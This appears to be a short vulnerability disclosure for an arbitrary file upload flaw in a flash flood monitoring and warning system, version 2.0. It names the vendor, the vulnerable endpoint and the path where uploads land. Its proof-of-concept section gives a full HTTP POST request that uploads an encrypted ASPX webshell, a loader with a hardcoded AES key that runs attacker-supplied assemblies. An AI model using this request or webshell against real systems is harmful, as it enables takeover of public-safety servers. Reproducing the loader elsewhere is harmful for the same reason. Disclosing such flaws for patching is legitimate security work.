Flash flood disaster monitoring and warning system 2.0 has arbitrary file upload vulnerability

official website:http://www.cdwanjiang.com/

version:2.0

Vulnerability location
\Controller\Ajaxfileupload.ashx

![WPS图片(1)](https://github.com/GUIqizsq/cve/assets/139303407/ed710216-86de-44ac-8b11-16a5df5b1592)

Trace class:

\bin\MFCW.Web.dll

// MFCW.Web.Controller.Ajaxfileupload

Unfiltered file types are available to obtain webshell. After upload location/upload/ContingencyPlan yyyyMMddhhmmssfff. Aspx
![WPS图片(2)](https://github.com/GUIqizsq/cve/assets/139303407/e2a286b9-ecbd-452d-96f1-a7a2b43fa405)

POC
```
POST /Controller/Ajaxfileupload.ashx HTTP/1.1
Host: xx.xx.xx.xx
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJa5U4zOAfmJDcYxj
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 541

------WebKitFormBoundaryJa5U4zOAfmJDcYxj
Content-Disposition: form-data; name="file"; filename="1.aspx"
Content-Type: image/jpeg

<%@ Page Language="C#" %><%@Import Namespace="System.Reflection"%><%Session.Add("k","e45e329feb5d925b");byte[] k = Encoding.Default.GetBytes(Session[0] + ""),c = Request.BinaryRead(Request.ContentLength);Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this);%>
------WebKitFormBoundaryJa5U4zOAfmJDcYxj--
```
![WPS图片(3)](https://github.com/GUIqizsq/cve/assets/139303407/2ff70f2c-499e-45b4-966c-494dc50fa439)
![WPS图片(4)](https://github.com/GUIqizsq/cve/assets/139303407/fae6280f-9ac3-46ee-9f7c-341d911d9bf9)

